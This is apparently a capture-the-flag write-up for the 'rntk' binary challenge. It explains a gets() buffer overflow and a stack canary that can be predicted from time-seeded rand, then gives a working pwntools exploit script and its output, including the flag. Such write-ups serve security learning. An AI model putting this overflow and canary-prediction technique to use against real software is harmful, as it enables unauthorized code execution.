# rntk

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/cf7a3562-f399-40c7-8190-a871c304b169)

example:
```
Please select one of the following actions
1) Generate random number                 
2) Try to guess a random number           
3) Exit                                   
1
289992663
Please select one of the following actions
1) Generate random number
2) Try to guess a random number
3) Exit
2
Enter in a number as your guess: 2
Better luck next time
Please select one of the following actions
1) Generate random number
2) Try to guess a random number
3) Exit
3
```

## solution

let's take a look at it in binja

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/4815fc7c-8419-429f-a826-13297cd59a5a)

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/70774450-10fe-4a7e-9cc7-149efec75aa6)

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/2444dc72-be0b-4643-9f3c-966fa4240f03)

we need to redirect execution to the win function

to do that, we can exploit `gets` in the `random_guess` to cause buffer overflow

however, we have to also keep the global_canary intact because otherwise stack smashing will be detected and the program will exit

luckily for us, the global canary just uses the seed of the random function is the time, so we can predict the global canary

then, we can overwrite the return address on the stack to redirect execution to the win function

solve.py
```py
from pwn import *
from time import time
from ctypes import CDLL
from ctypes.util import find_library

libc = CDLL(find_library("c"))

# p = process(["./rntk"])
p = remote("amt.rs", 31175)
# gdb.attach(p, "break *0x401384\nc")

libc.srand(int(time())+1)
print(libc.rand())
libc.srand(int(time()))
randed = (libc.rand())
print(randed)
libc.srand(int(time())-1)
print(libc.rand())

p.sendline(b"2")
p.sendline(cyclic(44) + p32(randed) + b"\x7f\xff\x00\x00\x00\x00\x00\x00" + p32(0x4012b6))

p.interactive()
```

it takes a few times because time is varying, but we eventually get the flag

```
[+] Opening connection to amt.rs on port 31175: Done
207278010
1579724371
809115839
[*] Switching to interactive mode
Please select one of the following actions
1) Generate random number
2) Try to guess a random number
3) Exit
Enter in a number as your guess: Better luck next time
amateursCTF{r4nd0m_n0t_s0_r4nd0m_after_all}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to amt.rs port 31175
```

additionally, we dont have to deal with ASLR, because the win function is inside of the main program and this is not an attack involving libc
